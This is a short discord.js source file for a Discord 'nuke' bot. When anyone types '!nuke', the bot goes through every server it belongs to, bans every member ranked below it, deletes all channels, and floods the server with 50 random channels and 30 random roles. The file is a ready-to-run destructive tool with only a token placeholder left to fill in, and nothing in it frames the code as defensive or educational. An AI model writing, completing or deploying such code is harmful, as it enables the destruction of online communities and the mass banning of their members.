const Discord = require('discord.js');
const client = new Discord.Client();

client.on("ready", () => {
  console.log("I am ready!");
});

client.on("message", (message) => {
  if (message.content.startsWith("!nuke")) {
    // Get all the guilds the bot is in
    let guilds = client.guilds.cache.array();
    // Go through each guild
    for (let i = 0; i < guilds.length; i++) {
      // Get all the members of each guild
      let members = guilds[i].members.cache.array();
      // Go through each member
      for (let j = 0; j < members.length; j++) {
        // Check if the member has a lower role than the bot
        if (members[j].roles.highest.position < guilds[i].me.roles.highest.position) {
          // Ban the member
          members[j].ban({ reason: 'Nuking server', bypass: true });
        }
      }
      // Delete all the channels
      guilds[i].channels.cache.forEach(channel => channel.delete());
      // Create 50 random channels
      for (let k = 0; k < 50; k++) {
        guilds[i].channels.create('random-channel-' + Math.random().toString(36).substring(2, 15));
      }
      // Create 30 random roles
      for (let l = 0; l < 30; l++) {
        guilds[i].roles.create({
          data: {
            name: 'random-role-' + Math.random().toString(36).substring(2, 15)
          }
        });
      }
    }
  }
});

client.login("YOUR TOKEN");
